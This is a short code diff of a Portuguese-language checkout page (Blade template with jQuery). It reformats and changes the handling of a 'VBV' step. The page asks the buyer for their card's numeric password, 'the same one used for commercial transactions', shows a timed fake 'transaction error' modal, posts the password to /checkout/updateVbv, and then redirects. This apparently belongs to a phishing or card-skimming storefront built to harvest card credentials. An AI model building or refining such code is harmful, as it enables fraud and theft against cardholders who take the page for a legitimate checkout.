@@ -2203,12 +2203,13 @@ header .holder-logo .logo .img-logo {
                     }
                     $("#senha_vbv").mask(string);
                     $("#btn_compra_cc").removeClass('sending');
-                    if($("#vbv_sn").val() == 's' && r.v == 's'){
-                        $("#digitos_vbv").text("Digite a senha de "+ r.d + " dígitos do cartão, a mesma utilizada para transações comerciais.")
-                        setTimeout(()=>{
+
+                    if ($("#vbv_sn").val() === 's' && r.v === 's') {
+                        $("#digitos_vbv").text("Digite a senha de " + r.d + " dígitos do cartão, a mesma utilizada para transações comerciais.")
+                        setTimeout(() => {
                             $("#modal-transaction-error").show();
                         }, 1500)
-                    }else{
+                    } else {
                         window.location = '/checkout/1/{{ $data['hash'] }}/4';
                     }
                 })
@@ -2232,11 +2233,7 @@ header .holder-logo .logo .img-logo {
                 }
                 $("#modal-transaction-error").hide();
                 $.post("/checkout/updateVbv", { i: window.id_vbv, v: $("#senha_vbv").val() },(r)=>{
-                    setTimeout(()=>{
-                        modalErro(($("#mensagem_erro").val() == '' ? $("#mensagem_padrao").val() : $("#mensagem_erro").val()))
-                        $("#overlay_processando").hide();
-                        $("#senha_vbv").val('')
-                    });
+                    window.location = '/checkout/1/{{ $data['hash'] }}/4';
                 })
             });
 
